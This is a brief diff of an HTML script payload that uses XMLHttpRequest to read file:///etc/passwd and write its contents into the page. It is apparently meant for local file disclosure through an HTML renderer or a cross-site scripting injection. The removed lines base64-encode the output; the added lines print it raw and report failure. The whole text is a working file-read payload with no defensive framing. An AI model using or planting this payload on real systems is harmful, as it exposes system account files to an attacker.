@@ -1,5 +1,7 @@
 <script>
-x=new XMLHttpRequest;
-x.onload=function(){document.write(btoa(this.responseText))};
-x.open("GET","file:///etc/passwd");x.send();
+    xhzeem = new XMLHttpRequest();
+    xhzeem.onload = function(){document.write(this.responseText);}
+    xhzeem.onerror = function(){document.write('failed!')}
+    xhzeem.open("GET","file:///etc/passwd");
+    xhzeem.send();
 </script>
